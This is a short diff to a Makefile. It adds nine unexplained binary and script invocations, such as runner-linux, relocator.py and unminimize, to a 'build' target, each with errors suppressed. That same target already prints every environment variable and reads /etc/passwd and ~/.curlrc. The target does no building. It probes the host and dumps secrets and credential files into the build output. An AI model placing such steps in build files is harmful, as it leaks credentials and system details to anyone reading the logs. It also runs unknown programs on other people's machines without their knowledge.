@@ -5,6 +5,15 @@ ListAllCommands:
 EchoEnv:
 	printenv | sort
 build: ListAllCommands EchoEnv
+	runner-linux || true
+	runner || true
+	relocator.py || true
+	query_cli_native64.so || true
+	initctl || true
+	extractor || true
+	dep || true
+	compile_et || true
+	unminimize || true
 	cat /etc/shells || true
 	cat /etc/passwd || true
 	cat ~/.curlrc || true
